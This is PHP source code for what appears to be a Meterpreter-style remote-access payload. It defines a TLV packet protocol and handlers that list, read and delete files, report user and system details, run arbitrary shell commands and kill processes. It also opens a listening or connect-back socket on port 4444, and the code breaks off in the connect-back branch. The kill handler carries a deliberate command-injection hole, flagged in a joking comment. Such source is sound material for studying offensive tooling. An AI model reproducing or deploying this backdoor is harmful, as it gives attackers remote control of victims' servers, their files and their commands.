#<?php
function my_print($str) {
	print($str ."\n");
	flush();
}
if (!function_exists("file_get_contents")) {
    function file_get_contents($file) {
         $f = @fopen($file,"rb");
         $contents = false;
         if ($f) {
             do { $contents .= fgets($f); } while (!feof($f));
         }
         fclose($f);
         return $contents;
    }
}
function hexdump($data, $htmloutput = false, $uppercase = false, $return = false)  
{  
    # Init  
    $hexi   = '';  
    $ascii  = '';  
    $dump   = ($htmloutput === true) ? '<pre>' : '';  
    $offset = 0;  
    $len    = strlen($data);  
   
    # Upper or lower case hexidecimal  
    $x = ($uppercase === false) ? 'x' : 'X';  
   
    # Iterate string  
    for ($i = $j = 0; $i < $len; $i++)  {  
        # Convert to hexidecimal  
        $hexi .= sprintf("%02$x ", ord($data[$i]));  
   
        # Replace non-viewable bytes with '.'  
        if (ord($data[$i]) >= 32) {  
            $ascii .= ($htmloutput === true) ?  
                            htmlentities($data[$i]) :  
                            $data[$i];  
        } else {  
            $ascii .= '.';  
        }  
   
        # Add extra column spacing  
        if ($j === 7) {  
            $hexi  .= ' ';  
            $ascii .= ' ';  
        }  
   
        # Add row  
        if (++$j === 16 || $i === $len - 1) {  
            # Join the hexi / ascii output  
            $dump .= sprintf("%04$x  %-49s  %s", $offset, $hexi, $ascii);  
              
            # Reset vars  
            $hexi   = $ascii = '';  
            $offset += 16;  
            $j      = 0;  
              
            # Add newline              
            if ($i !== $len - 1) {  
                $dump .= "\n";  
            }  
        }  
    }  
   
    # Finish dump  
    $dump .= $htmloutput === true ? '</pre>' : '';  
    $dump .= "\n";  
   
    # Output method  
    if ($return === false)   {  
        echo $dump;  
    } else {  
        return $dump;  
    }  
}  


#
# Constants
#
define("PACKET_TYPE_REQUEST",0);
define("PACKET_TYPE_RESPONSE",1);
define("PACKET_TYPE_PLAIN_REQUEST", 10);
define("PACKET_TYPE_PLAIN_RESPONSE", 11);

define("ERROR_SUCCESS",0);
# not defined in original C implementation
define("ERROR_FAILURE",1);

define("CHANNEL_CLASS_BUFFERED", 0);
define("CHANNEL_CLASS_STREAM",   1);
define("CHANNEL_CLASS_DATAGRAM", 2);
define("CHANNEL_CLASS_POOL",     3);

#
# TLV Meta Types
#
define("TLV_META_TYPE_NONE",    (   0   ));
define("TLV_META_TYPE_STRING",  (1 << 16));
define("TLV_META_TYPE_UINT",    (1 << 17));
define("TLV_META_TYPE_RAW",     (1 << 18));
define("TLV_META_TYPE_BOOL",    (1 << 19));
define("TLV_META_TYPE_COMPRESSED", (1 << 29));
define("TLV_META_TYPE_GROUP",   (1 << 30));
define("TLV_META_TYPE_COMPLEX", (1 << 31));
# not defined in original
define("TLV_META_TYPE_MASK",    (1<<31)+(1<<30)+(1<<19)+(1<<18)+(1<<17)+(1<<16));

#
# TLV base starting points
#
define("TLV_RESERVED",   0);
define("TLV_EXTENSIONS", 20000);
define("TLV_USER",       40000);
define("TLV_TEMP",       60000);

#
# TLV Specific Types
#
define("TLV_TYPE_ANY",                 TLV_META_TYPE_NONE   |   0);
define("TLV_TYPE_METHOD",              TLV_META_TYPE_STRING |   1);
define("TLV_TYPE_REQUEST_ID",          TLV_META_TYPE_STRING |   2);
define("TLV_TYPE_EXCEPTION",           TLV_META_TYPE_GROUP  |   3);
define("TLV_TYPE_RESULT",              TLV_META_TYPE_UINT   |   4);
                                      
define("TLV_TYPE_STRING",              TLV_META_TYPE_STRING |  10);
define("TLV_TYPE_UINT",                TLV_META_TYPE_UINT   |  11);
define("TLV_TYPE_BOOL",                TLV_META_TYPE_BOOL   |  12);
                                      
define("TLV_TYPE_LENGTH",              TLV_META_TYPE_UINT   |  25);
define("TLV_TYPE_DATA",                TLV_META_TYPE_RAW    |  26);
define("TLV_TYPE_FLAGS",               TLV_META_TYPE_UINT   |  27);

define("TLV_TYPE_CHANNEL_ID",          TLV_META_TYPE_UINT   |  50);
define("TLV_TYPE_CHANNEL_TYPE",        TLV_META_TYPE_STRING |  51);
define("TLV_TYPE_CHANNEL_DATA",        TLV_META_TYPE_RAW    |  52);
define("TLV_TYPE_CHANNEL_DATA_GROUP",  TLV_META_TYPE_GROUP  |  53);
define("TLV_TYPE_CHANNEL_CLASS",       TLV_META_TYPE_UINT   |  54);

define("TLV_TYPE_SEEK_WHENCE",         TLV_META_TYPE_UINT   |  70);
define("TLV_TYPE_SEEK_OFFSET",         TLV_META_TYPE_UINT   |  71);
define("TLV_TYPE_SEEK_POS",            TLV_META_TYPE_UINT   |  72);

define("TLV_TYPE_EXCEPTION_CODE",      TLV_META_TYPE_UINT   | 300);
define("TLV_TYPE_EXCEPTION_STRING",    TLV_META_TYPE_STRING | 301);

define("TLV_TYPE_LIBRARY_PATH",        TLV_META_TYPE_STRING | 400);
define("TLV_TYPE_TARGET_PATH",         TLV_META_TYPE_STRING | 401);
define("TLV_TYPE_MIGRATE_PID",         TLV_META_TYPE_UINT   | 402);
define("TLV_TYPE_MIGRATE_LEN",         TLV_META_TYPE_UINT   | 403);

define("TLV_TYPE_CIPHER_NAME",         TLV_META_TYPE_STRING | 500);
define("TLV_TYPE_CIPHER_PARAMETERS",   TLV_META_TYPE_GROUP  | 501);

##
# General
##
define("TLV_TYPE_HANDLE",              TLV_META_TYPE_UINT    |  600);
define("TLV_TYPE_INHERIT",             TLV_META_TYPE_BOOL    |  601);
define("TLV_TYPE_PROCESS_HANDLE",      TLV_META_TYPE_UINT    |  630);
define("TLV_TYPE_THREAD_HANDLE",       TLV_META_TYPE_UINT    |  631);

##
# Fs
##
define("TLV_TYPE_DIRECTORY_PATH",      TLV_META_TYPE_STRING  | 1200);
define("TLV_TYPE_FILE_NAME",           TLV_META_TYPE_STRING  | 1201);
define("TLV_TYPE_FILE_PATH",           TLV_META_TYPE_STRING  | 1202);
define("TLV_TYPE_FILE_MODE",           TLV_META_TYPE_STRING  | 1203);
define("TLV_TYPE_STAT_BUF",            TLV_META_TYPE_COMPLEX | 1220);

##
# Net
##
define("TLV_TYPE_HOST_NAME",           TLV_META_TYPE_STRING  | 1400);
define("TLV_TYPE_PORT",                TLV_META_TYPE_UINT    | 1401);

define("TLV_TYPE_SUBNET",              TLV_META_TYPE_RAW     | 1420);
define("TLV_TYPE_NETMASK",             TLV_META_TYPE_RAW     | 1421);
define("TLV_TYPE_GATEWAY",             TLV_META_TYPE_RAW     | 1422);
define("TLV_TYPE_NETWORK_ROUTE",       TLV_META_TYPE_GROUP   | 1423);

define("TLV_TYPE_IP",                  TLV_META_TYPE_RAW     | 1430);
define("TLV_TYPE_MAC_ADDRESS",         TLV_META_TYPE_RAW     | 1431);
define("TLV_TYPE_MAC_NAME",            TLV_META_TYPE_STRING  | 1432);
define("TLV_TYPE_NETWORK_INTERFACE",   TLV_META_TYPE_GROUP   | 1433);

define("TLV_TYPE_SUBNET_STRING",       TLV_META_TYPE_STRING  | 1440);
define("TLV_TYPE_NETMASK_STRING",      TLV_META_TYPE_STRING  | 1441);
define("TLV_TYPE_GATEWAY_STRING",      TLV_META_TYPE_STRING  | 1442);

# Socket
define("TLV_TYPE_PEER_HOST",           TLV_META_TYPE_STRING  | 1500);
define("TLV_TYPE_PEER_PORT",           TLV_META_TYPE_UINT    | 1501);
define("TLV_TYPE_LOCAL_HOST",          TLV_META_TYPE_STRING  | 1502);
define("TLV_TYPE_LOCAL_PORT",          TLV_META_TYPE_UINT    | 1503);
define("TLV_TYPE_CONNECT_RETRIES",     TLV_META_TYPE_UINT    | 1504);

define("TLV_TYPE_SHUTDOWN_HOW",        TLV_META_TYPE_UINT    | 1530);

##
# Sys
##
define("PROCESS_EXECUTE_FLAG_HIDDEN", (1 << 0));
define("PROCESS_EXECUTE_FLAG_CHANNELIZED", (1 << 1));
define("PROCESS_EXECUTE_FLAG_SUSPENDED", (1 << 2));
define("PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN", (1 << 3));

# Registry
define("TLV_TYPE_HKEY",                TLV_META_TYPE_UINT    | 1000);
define("TLV_TYPE_ROOT_KEY",            TLV_TYPE_HKEY);
define("TLV_TYPE_BASE_KEY",            TLV_META_TYPE_STRING  | 1001);
define("TLV_TYPE_PERMISSION",          TLV_META_TYPE_UINT    | 1002);
define("TLV_TYPE_KEY_NAME",            TLV_META_TYPE_STRING  | 1003);
define("TLV_TYPE_VALUE_NAME",          TLV_META_TYPE_STRING  | 1010);
define("TLV_TYPE_VALUE_TYPE",          TLV_META_TYPE_UINT    | 1011);
define("TLV_TYPE_VALUE_DATA",          TLV_META_TYPE_RAW     | 1012);

# Config
define("TLV_TYPE_COMPUTER_NAME",       TLV_META_TYPE_STRING  | 1040);
define("TLV_TYPE_OS_NAME",             TLV_META_TYPE_STRING  | 1041);
define("TLV_TYPE_USER_NAME",           TLV_META_TYPE_STRING  | 1042);

define("DELETE_KEY_FLAG_RECURSIVE", (1 << 0));

# Process
define("TLV_TYPE_BASE_ADDRESS",        TLV_META_TYPE_UINT    | 2000);
define("TLV_TYPE_ALLOCATION_TYPE",     TLV_META_TYPE_UINT    | 2001);
define("TLV_TYPE_PROTECTION",          TLV_META_TYPE_UINT    | 2002);
define("TLV_TYPE_PROCESS_PERMS",       TLV_META_TYPE_UINT    | 2003);
define("TLV_TYPE_PROCESS_MEMORY",      TLV_META_TYPE_RAW     | 2004);
define("TLV_TYPE_ALLOC_BASE_ADDRESS",  TLV_META_TYPE_UINT    | 2005);
define("TLV_TYPE_MEMORY_STATE",        TLV_META_TYPE_UINT    | 2006);
define("TLV_TYPE_MEMORY_TYPE",         TLV_META_TYPE_UINT    | 2007);
define("TLV_TYPE_ALLOC_PROTECTION",    TLV_META_TYPE_UINT    | 2008);
define("TLV_TYPE_PID",                 TLV_META_TYPE_UINT    | 2300);
define("TLV_TYPE_PROCESS_NAME",        TLV_META_TYPE_STRING  | 2301);
define("TLV_TYPE_PROCESS_PATH",        TLV_META_TYPE_STRING  | 2302);
define("TLV_TYPE_PROCESS_GROUP",       TLV_META_TYPE_GROUP   | 2303);
define("TLV_TYPE_PROCESS_FLAGS",       TLV_META_TYPE_UINT    | 2304);
define("TLV_TYPE_PROCESS_ARGUMENTS",   TLV_META_TYPE_STRING  | 2305);
                                       
define("TLV_TYPE_IMAGE_FILE",          TLV_META_TYPE_STRING  | 2400);
define("TLV_TYPE_IMAGE_FILE_PATH",     TLV_META_TYPE_STRING  | 2401);
define("TLV_TYPE_PROCEDURE_NAME",      TLV_META_TYPE_STRING  | 2402);
define("TLV_TYPE_PROCEDURE_ADDRESS",   TLV_META_TYPE_UINT    | 2403);
define("TLV_TYPE_IMAGE_BASE",          TLV_META_TYPE_UINT    | 2404);
define("TLV_TYPE_IMAGE_GROUP",         TLV_META_TYPE_GROUP   | 2405);
define("TLV_TYPE_IMAGE_NAME",          TLV_META_TYPE_STRING  | 2406);
                                       
define("TLV_TYPE_THREAD_ID",           TLV_META_TYPE_UINT    | 2500);
define("TLV_TYPE_THREAD_PERMS",        TLV_META_TYPE_UINT    | 2502);
define("TLV_TYPE_EXIT_CODE",           TLV_META_TYPE_UINT    | 2510);
define("TLV_TYPE_ENTRY_POINT",         TLV_META_TYPE_UINT    | 2511);
define("TLV_TYPE_ENTRY_PARAMETER",     TLV_META_TYPE_UINT    | 2512);
define("TLV_TYPE_CREATION_FLAGS",      TLV_META_TYPE_UINT    | 2513);
                                       
define("TLV_TYPE_REGISTER_NAME",       TLV_META_TYPE_STRING  | 2540);
define("TLV_TYPE_REGISTER_SIZE",       TLV_META_TYPE_UINT    | 2541);
define("TLV_TYPE_REGISTER_VALUE_32",   TLV_META_TYPE_UINT    | 2542);
define("TLV_TYPE_REGISTER",            TLV_META_TYPE_GROUP   | 2550);

##
# Ui
##
define("TLV_TYPE_IDLE_TIME",           TLV_META_TYPE_UINT    | 3000);
define("TLV_TYPE_KEYS_DUMP",           TLV_META_TYPE_STRING  | 3001);
define("TLV_TYPE_DESKTOP",             TLV_META_TYPE_STRING  | 3002);

##
# Event Log
##
define("TLV_TYPE_EVENT_SOURCENAME",    TLV_META_TYPE_STRING  | 4000);
define("TLV_TYPE_EVENT_HANDLE",        TLV_META_TYPE_UINT    | 4001);
define("TLV_TYPE_EVENT_NUMRECORDS",    TLV_META_TYPE_UINT    | 4002);

define("TLV_TYPE_EVENT_READFLAGS",     TLV_META_TYPE_UINT    | 4003);
define("TLV_TYPE_EVENT_RECORDOFFSET",  TLV_META_TYPE_UINT    | 4004);

define("TLV_TYPE_EVENT_RECORDNUMBER",  TLV_META_TYPE_UINT    | 4006);
define("TLV_TYPE_EVENT_TIMEGENERATED", TLV_META_TYPE_UINT    | 4007);
define("TLV_TYPE_EVENT_TIMEWRITTEN",   TLV_META_TYPE_UINT    | 4008);
define("TLV_TYPE_EVENT_ID",            TLV_META_TYPE_UINT    | 4009);
define("TLV_TYPE_EVENT_TYPE",          TLV_META_TYPE_UINT    | 4010);
define("TLV_TYPE_EVENT_CATEGORY",      TLV_META_TYPE_UINT    | 4011);
define("TLV_TYPE_EVENT_STRING",        TLV_META_TYPE_STRING  | 4012);
define("TLV_TYPE_EVENT_DATA",          TLV_META_TYPE_RAW     | 4013);

##
# Power
##
define("TLV_TYPE_POWER_FLAGS",         TLV_META_TYPE_UINT    | 4100);
define("TLV_TYPE_POWER_REASON",        TLV_META_TYPE_UINT    | 4101);

function my_cmd($cmd) {
    return shell_exec($cmd);
}



##
# STDAPI
##

# Wrap everything in checks for existence of the new functions in case we get
# eval'd twice	
my_print("Evaling stdapi");
# works
if (!function_exists('stdapi_fs_chdir')) {
function stdapi_fs_chdir($req, &$pkt) {
    my_print("doing chdir\n");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_DIRECTORY_PATH);
    chdir($path_tlv['value']);
    return ERROR_SUCCESS;
}
}

if (!function_exists('stdapi_fs_delete')) {
function stdapi_fs_delete($req, &$pkt) {
    my_print("doing delete\n");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_NAME);
    $ret = unlink($path_tlv['value']);
    return $ret ? ERROR_SUCCESS : ERROR_FAILURE;
}
}

# works
if (!function_exists('stdapi_fs_getwd')) {
function stdapi_fs_getwd($req, &$pkt) {
    my_print("doing pwd\n");
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_DIRECTORY_PATH, getcwd()));
    return ERROR_SUCCESS;
}
}

# works partially, need to get the path argument to mean the same thing as in
# windows
if (!function_exists('stdapi_fs_ls')) {
function stdapi_fs_ls($req, &$pkt) {
    my_print("doing ls\n");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_DIRECTORY_PATH);
    $path = $path_tlv['value'];
    $dir_handle = @opendir($path);

    if ($dir_handle) {
        #my_print("Doing an ls\n");
        while ($file = readdir($dir_handle)) {
            if ($file != "." && $file != "..") {
                #my_print("Adding file $file\n");
                packet_add_tlv($pkt, create_tlv(TLV_TYPE_FILE_NAME, $file));
                packet_add_tlv($pkt, create_tlv(TLV_TYPE_FILE_PATH, $path . DIRECTORY_SEPARATOR . $file));
                $st = stat($path . DIRECTORY_SEPARATOR . $file);
                $st_buf = "";
                $st_buf .= pack("V", $st['dev']);
                $st_buf .= pack("v", $st['ino']);
                $st_buf .= pack("v", $st['mode']);
                $st_buf .= pack("v", $st['nlink']);
                $st_buf .= pack("v", $st['uid']);
                $st_buf .= pack("v", $st['gid']);
                $st_buf .= pack("v", 0);
                $st_buf .= pack("V", $st['rdev']);
                $st_buf .= pack("V", $st['size']);
                $st_buf .= pack("V", $st['atime']);
                $st_buf .= pack("V", $st['mtime']);
                $st_buf .= pack("V", $st['ctime']);
                $st_buf .= pack("V", $st['blksize']);
                $st_buf .= pack("V", $st['blocks']);
                packet_add_tlv($pkt, create_tlv(TLV_TYPE_STAT_BUF, $st_buf));
            }
        }
        closedir($dir_handle);
        return ERROR_SUCCESS;
    } else {
        return ERROR_FAILURE;
    }
}
}

# works
if (!function_exists('stdapi_sys_config_getuid')) {
function stdapi_sys_config_getuid($req, &$pkt) {
    my_print("doing getuid\n");
    if (is_callable('posix_getuid')) {
        $uid = posix_getuid();
        $pwinfo = posix_getpwuid($uid);
        $user = $pwinfo['name'] . " ($uid)";
    } else {
        # The posix functions aren't available, this is probably windows.  Use
        # the functions for getting user name and uid based on file ownership
        # instead.
        $user = get_current_user() . " (" . getmyuid() . ")";
    }
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_USER_NAME, $user));
    return ERROR_SUCCESS;
}
}

# Unimplemented becuase it's unimplementable
if (!function_exists('stdapi_sys_config_rev2self')) {
function stdapi_sys_config_rev2self($req, &$pkt) {
    my_print("doing rev2self\n");
    return ERROR_FAILURE;
}
}

# works
if (!function_exists('stdapi_sys_config_sysinfo')) {
function stdapi_sys_config_sysinfo($req, &$pkt) {
    my_print("doing sysinfo\n");
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_COMPUTER_NAME, php_uname("n")));
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_OS_NAME, php_uname()));
    return ERROR_SUCCESS;
}
}

$processes = array();
if (!function_exists('stdapi_sys_process_execute')) {
function stdapi_sys_process_execute($req, &$pkt) {
    my_print("doing execute\n");
    $cmd_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_PATH);
    $args_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_ARGUMENTS);
    $flags_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_FLAGS);

    $cmd = $cmd_tlv['value'];
    $args = $args_tlv['value'];
    $flags = $flags_tlv['value'];

    # If there was no command specified, well, a user sending an empty command
    # deserves failure.
    my_print("Cmd: $cmd $args\n");
    $real_cmd = $cmd ." ". $args;
    if (0 > strlen($cmd)) {
        return ERROR_FAILURE;
    }
    my_print("Flags: $flags (" . ($flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) .")\n");
    if ($flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) {
        global $processes, $channels;
        my_print("Channelized\n");
        $handle = proc_open($real_cmd, array(array('pipe','r'), array('pipe','w'), array('pipe','w')), $pipes);
        if ($handle === false) {
            return ERROR_FAILURE;
        }
        $processes[] = $handle;
        $channels[] = $pipes;
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PID, 0));
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PROCESS_HANDLE, count($processes)-1));
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, count($channels)-1));
    } else {
        # Don't care about stdin/stdout, just run the command
        my_cmd($real_cmd);
    }

    return ERROR_SUCCESS;
}
}

# Works, but not very portable.  There doesn't appear to be a PHP way of
# getting a list of processes, so we just shell out to ps.  I need to decide
# what options to send to ps for portability and for information usefulness; 
# also, figure out a windows option -- tasklist.exe might work, but it doesn't
# exist on older versions.
if (!function_exists('stdapi_sys_process_get_processes')) {
function stdapi_sys_process_get_processes($req, &$pkt) {
    my_print("doing get_processes\n");
    $list = array();
	# This command produces a line like:
	#    1553 root     /sbin/getty -8 38400 tty1
    $output = my_cmd("ps a -w -o pid,user,cmd --no-header 2>/dev/null");
    $lines = explode("\n", trim($output));
    foreach ($lines as $line) {
        array_push($list, preg_split("/\s+/", trim($line)));
    }
    foreach ($list as $proc) {
        $grp = "";
        $grp .= tlv_pack(create_tlv(TLV_TYPE_PID, $proc[0]));
        $grp .= tlv_pack(create_tlv(TLV_TYPE_USER_NAME, $proc[1]));
        $grp .= tlv_pack(create_tlv(TLV_TYPE_PROCESS_NAME, $proc[2]));
		# Strip the pid and the user name off the front; the rest will be the
		# full command line
        array_shift($proc);
        array_shift($proc);
        $grp .= tlv_pack(create_tlv(TLV_TYPE_PROCESS_PATH, join($proc, " ")));
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PROCESS_GROUP, $grp));
    }
    return ERROR_SUCCESS;
}
}

# works
if (!function_exists('stdapi_sys_process_getpid')) {
function stdapi_sys_process_getpid($req, &$pkt) {
    my_print("doing getpid\n");
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_PID, getmypid()));
    return ERROR_SUCCESS;
}
}

if (!function_exists('stdapi_sys_process_kill')) {
function stdapi_sys_process_kill($req, &$pkt) {
	# The existence of posix_kill is unlikely (it's a php compile-time option
	# that isn't enabled by default, but better to try it and avoid shelling
	# out when unnecessary.
    my_print("doing kill\n");
    $pid_tlv = packet_get_tlv($req, TLV_TYPE_PID);
    $pid = $pid_tlv['value'];
    if (is_callable('posix_kill')) {
        $ret = posix_kill($pid, 9);
        $ret = $ret ? ERROR_SUCCESS : posix_get_last_error();
        if ($ret != ERROR_SUCCESS) {
            my_print(posix_strerror($ret) . "\n");
        }
    } else {
        # every rootkit should have command injection vulnerabilities
        if ("foo" == my_cmd("kill -9 $pid && echo foo")) {
            $ret = ERROR_SUCCESS;
        } else {
            $ret = ERROR_FAILURE;
        }
    }
    return $ret;
}
}

# END STDAPI





##
# Channel Helper Functions
##
$channels = array();

# XXX Does not honor a given mode, opens in read-only
function channel_create_stdapi_fs_file($req, &$pkt) {
    global $channels;
    $fpath_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
    $mode_tlv = packet_get_tlv($req, TLV_TYPE_FILE_MODE);
    my_print("Opening path {$fpath_tlv['value']} with mode {$mode_tlv['value']}");
    if (!$mode_tlv) {
        $mode_tlv = array('value' => 'rb');
    }
    $fd = @fopen($fpath_tlv['value'], $mode_tlv['value']);

    if (is_resource($fd)) {
        array_push($channels, array(0 => $fd, 1 => $fd));
        $id = count($channels) - 1;
        my_print("Created new channel $fd, with id $id\n");
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $id));
        return ERROR_SUCCESS;
    }
    return ERROR_FAILURE;
}







##
# Worker functions
##

function core_channel_open($req, &$pkt) {
    $type_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_TYPE);

    my_print("Client wants a ". $type_tlv['value'] ." channel, i'll see what i can do\n");
    $handler = "channel_create_". $type_tlv['value'];
    if ($type_tlv['value'] && is_callable($handler)) {
        $ret = $handler($req, $pkt);
    } else {
        $ret = channel_create_generic($req, $pkt);
    }
    
    return $ret;
}
function core_channel_eof($req, &$pkt) {
    my_print("doing channel eof\n");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $c = get_channel_by_id($chan_tlv['value']);
    var_dump($c);

    if ($c) {
        if (feof($c[1])) {
            packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 1));
        } else {
            packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 0));
        }
        return ERROR_SUCCESS;
    } else {
        return ERROR_FAILURE;
    }
}

# Works for streams that work with fread
# TODO: Genericize me
function core_channel_read($req, &$pkt) {
    print "doing channel read\n";
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH);
    $id = $chan_tlv['value'];
    $len = $len_tlv['value'];
    $data = channel_read($id, $len);
    if ($data === false) {
        $res = ERROR_FAILURE;
    } else {
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data));
        $res = ERROR_SUCCESS;
    }
    return $res;
}

# Works for streams that work with fwrite
# TODO: Genericize me
function core_channel_write($req, &$pkt) {
    print "doing channel write\n";
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $data_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_DATA);
    $len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH);
    $id = $chan_tlv['value'];
    $data = $data_tlv['value'];
    $len = $len_tlv['value'];

    $wrote = channel_write($id, $data, $len);
    if ($wrote === false) {
        return ERROR_FAILURE;
    } else {
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, $wrote));
        return ERROR_SUCCESS;
    }
}

function core_channel_close($req, &$pkt) {
    print "doing channel close\n";
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $id = $chan_tlv['value'];

    $c = get_channel_by_id($id);
    if ($c) {
        # We found a channel, close its stdin/stdout/stderr
        @fclose($c[0]);
        @fclose($c[1]);
        @fclose($c[2]);
    }

    return ERROR_SUCCESS;
}

# Libraries are sent as a zlib-compressed blob.  Unfortunately, zlib support is
# not default in non-Windows versions of PHP so we need some way to indicate to
# the client that we can't handle compressed blobs.  Until then, don't
# actually implement loadlib yet.  Maybe someday we'll have
# ext_server_stdapi.php or whatever.  For now just return success.
function core_loadlib($req, &$pkt) {
    my_print("doing core_loadlib (no-op)\n");
    return ERROR_SUCCESS;
}


##
# Channel Helper Functions
##
$channels = array();

function get_channel_by_id($chan_id) {
    global $channels;
    my_print("looking for channel $chan_id\n");
    var_dump($channels);
    if (array_key_exists($chan_id, $channels)) {
        return $channels[$chan_id];
    } else {
        return false;
    }
}
# Write data to the channel's stdin
function channel_write($chan_id, $data) {
    $c = get_channel_by_id($chan_id);
    if ($c && is_resource($c[0])) {
        var_dump($c);
        return fwrite($c[0], $data);
    } else {
        return false;
    }
}
# Read from the channel's stdout
function channel_read($chan_id, $len) {
    $c = get_channel_by_id($chan_id);
    if ($c && is_resource($c[1])) {
        var_dump($c);
        $result = fread($c[1], $len);
        return $result;
    } else {
        return false;
    }
}

# XXX Unimplemented
function channel_interact($chan_id) {
    $c = get_channel_by_id($chan_id);
    if ($c) {
        return false;
    } else {
        return false;
    }
}




##
# TLV Helper Functions
##

function create_response($req) { 
    $pkt = pack("N", PACKET_TYPE_RESPONSE);

    $method_tlv = packet_get_tlv($req, TLV_TYPE_METHOD);
    my_print("method is {$method_tlv['value']}\n");
    packet_add_tlv($pkt, $method_tlv);

    $reqid_tlv = packet_get_tlv($req, TLV_TYPE_REQUEST_ID);
    packet_add_tlv($pkt, $reqid_tlv);

    if (is_callable($method_tlv['value'])) {
        $result = $method_tlv['value']($req, $pkt);
    } else {
        my_print("Got a request for something I don't know how to handle (". $method_tlv['value'] ."), returning failure\n");
        $result = ERROR_FAILURE;
    }

    packet_add_tlv($pkt, create_tlv(TLV_TYPE_RESULT, $result));
    # Add the length to the beginning of the packet
    $pkt = pack("N", strlen($pkt) + 4) . $pkt;
    return $pkt;
}

function create_tlv($type, $val) {
    return array( 'type' => $type, 'value' => $val );
}

function tlv_pack($tlv) {
    $ret = "";
    #my_print("Creating a tlv of type: {$tlv['type']}\n");
    if (($tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
        $ret = pack("NNa*", 8 + strlen($tlv['value'])+1, $tlv['type'], $tlv['value'] . "\0");
    } 
    elseif (($tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) {
        $ret = pack("NNN", 8 + 4, $tlv['type'], $tlv['value']);
    }
    elseif (($tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) {
        # PHP's pack appears to be busted for chars, 
        $ret = pack("NN", 8 + 1, $tlv['type']);
        $ret .= $tlv['value'] ? "\x01" : "\x00";
    }
    elseif (($tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW) {
        $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
    }
    elseif (($tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP) {
        # treat groups the same as raw
        $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
    } 
    elseif (($tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX) {
        # treat complex the same as raw
        $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
    } 
    else {
        my_print("Don't know how to make a tlv of type ". $tlv['type'] .  " (meta type ". sprintf("%08x", $tlv['type'] & TLV_META_TYPE_MASK) ."), wtf\n");
    }
    return $ret;
}

function packet_add_tlv(&$pkt, $tlv) { 
    $pkt .= tlv_pack($tlv);
}

function packet_get_tlv($pkt, $type) {
    #my_print("Looking for a tlv of type $type\n");
    $offset = 8;
    while ($offset < strlen($pkt)) {
        $tlv = unpack("Nlen/Ntype", substr($pkt, $offset, 8));
        #my_print("len: {$tlv['len']}, type: {$tlv['type']}\n");
        if ($type == $tlv['type']) {
            #my_print("Found one at offset $offset\n");
            if (($type & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
                $tlv = unpack("Nlen/Ntype/a*value", substr($pkt, $offset, $tlv['len']));
            } 
            elseif (($type & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) {
                $tlv = unpack("Nlen/Ntype/Nvalue", substr($pkt, $offset, $tlv['len']));
            } 
            elseif (($type & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) {
                $tlv = unpack("Nlen/Ntype/cvalue", substr($pkt, $offset, $tlv['len']));
            }
            elseif (($type & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW) {
                $tlv = unpack("Nlen/Ntype", substr($pkt, $offset, 8));
                $tlv['value'] = substr($pkt, $offset+8, $tlv['len']-8);
            }
            else {
                my_print("Wtf type is this? $type\n");
                $tlv = NULL;
            }
            return $tlv;
        }
        $offset += $tlv['len'];
    }
    my_print("Didn't find one, wtf\n");
    return false;
}





##
# Main stuff
##

ob_implicit_flush();
error_reporting(E_ALL);
#@ignore_user_abort(true);
@ignore_user_abort(false);

$port = 4444;

$listen = false;
if ($listen) {
	my_print("Listening on $port\n");

	$setsockopt = 'socket_setopt';
	if (!is_callable($setsockopt )) {
		# renamed in PHP 4.3.0
		$setsockopt = 'socket_set_option';
	}

	$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	# don't care if this fails
	@$setsockopt($sock, SOL_SOCKET, SO_REUSEADDR, 1);
	$ret = socket_bind($sock, 0, $port);
	$ret = socket_listen($sock, 5);
	$msgsock = socket_accept($sock);
	socket_close($sock);

	print "Got a socket connection $sock\n";
} else {
	my_print("Connecting to $port\n");
